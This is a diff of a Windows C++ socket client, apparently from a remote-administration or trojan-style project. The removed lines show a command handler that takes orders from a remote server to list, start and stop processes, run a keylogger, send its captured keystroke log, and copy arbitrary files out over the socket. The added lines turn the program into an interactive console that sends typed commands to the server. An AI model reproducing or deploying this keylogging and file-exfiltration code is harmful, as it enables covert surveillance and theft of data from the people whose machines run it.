@@ -1,18 +1,4 @@
-#include <WinSock2.h>
-#include <WS2tcpip.h>
-#include <iostream>
-#include <string>
-#include <fstream>
-#include <cstdint>
-#include "../includes/process_utils.h"
-#include "../includes/keylogger.h"
-#include <thread>
-#include <mutex>
-#include <atomic>
-#include <Windows.h>
-#include <sstream>
-
-#pragma comment(lib, "ws2_32.lib")
+#include "../includes/tasks.h"
 
 bool sendFileContent(SOCKET sock, const std::string& filename)
 {
@@ -92,83 +78,6 @@ bool sendFile(SOCKET sock, const std::string& filePath)
     return true;
 }
 
-void handleCommand(SOCKET sock, const std::string& cmd)
-{
-    if (cmd == "list")
-    {
-        listProcesses();
-        sendFileContent(sock, "process_list.txt");
-    }
-    else if (cmd.rfind("start ", 0) == 0)
-    {
-        std::string path = cmd.substr(6);
-        bool ok = startProcess(path);
-        
-        std::string msg = ok ? "Process started successfully." : "Failed to start process.";
-        send(sock, msg.c_str(), msg.size(), 0);
-    }
-    else if (cmd.rfind("stop ", 0) == 0)
-    {
-        std::string name = cmd.substr(5);
-        bool ok = stopProcess(name);
-        std::string msg = ok ? "Process stopped successfully." : "Failed to stop process.";
-        send(sock, msg.c_str(), msg.size(), 0);
-    }
-    else if (cmd == "start_keylogger")
-    {
-        startKeylogger();
-        std::string msg = "Keylogger started.";
-        send(sock, msg.c_str(), msg.size(), 0);
-    }
-    else if (cmd == "stop_keylogger")
-    {
-        stopKeylogger();
-        std::string msg = "Keylogger stopped.";
-        send(sock, msg.c_str(), msg.size(), 0);
-    }
-    else if (cmd == "keylogger_log")
-    {
-        std::string filename = "keylogger_log.txt";
-        std::ifstream file(filename, std::ios::binary);
-        if (file.is_open())
-        {
-            std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
-            uint32_t length = content.size();
-            if (send(sock, reinterpret_cast<const char*>(&length), sizeof(length), 0) == SOCKET_ERROR)
-            {
-                std::cerr << "Failed to send keylogger log length: " << WSAGetLastError() << std::endl;
-                return;
-            }
-            if (send(sock, content.c_str(), length, 0) == SOCKET_ERROR)
-            {
-                std::cerr << "Failed to send keylogger log content: " << WSAGetLastError() << std::endl;
-                return;
-            }
-            file.close();
-            std::cout << "Sent keylogger log with size: " << length << " bytes." << std::endl;
-        }
-    }
-    else if (cmd.rfind("copy_file ", 0) == 0)
-    {
-        std::string filePath = cmd.substr(10);
-        if (sendFile(sock, filePath))
-        {
-            std::string msg = "File copied successfully.";
-            send(sock, msg.c_str(), msg.size(), 0);
-        }
-        else
-        {
-            std::string msg = "Failed to copy file.";
-            send(sock, msg.c_str(), msg.size(), 0);
-        }
-    }
-    else
-    {
-        std::string msg = "Unknown command: " + cmd;
-        send(sock, msg.c_str(), msg.size(), 0);
-    }
-}
-
 int main()
 {
     WSADATA wsa;
@@ -186,17 +95,38 @@ int main()
 
     connect(sock, (sockaddr*)&server, sizeof(server));
     std::cout << "Connected to server." << std::endl;
+    std::cout << "Type 'help' to see available commands." << std::endl;
 
-    char buffer[1024];
     while (true)
     {
-        int len = recv(sock, buffer, sizeof(buffer) - 1, 0);
-        if (len <= 0) break;
+        std::string cmd;
+        std::cout << "Enter command (or 'exit' to quit): ";
+        std::getline(std::cin, cmd);
 
+        if (cmd == "exit")
+        {
+            std::cout << "Exiting client." << std::endl;
+            break;
+        }
+
+        // Gửi lệnh đến server
+        if (send(sock, cmd.c_str(), cmd.size(), 0) == SOCKET_ERROR)
+        {
+            std::cerr << "Failed to send command to server." << std::endl;
+            break;
+        }
+        std::cout << "Command sent: " << cmd << std::endl;
+
+        // Nhận response từ server
+        char buffer[1024];
+        int len = recv(sock, buffer, sizeof(buffer) - 1, 0);
+        if (len <= 0) 
+        {
+            std::cout << "Server disconnected." << std::endl;
+            break;
+        }
         buffer[len] = '\0';
-        std::string cmd(buffer);
-        std::cout << "Received command: " << cmd << std::endl;
-        handleCommand(sock, cmd);
+        std::cout << "Server response: " << buffer << std::endl;
     }
 
     closesocket(sock);
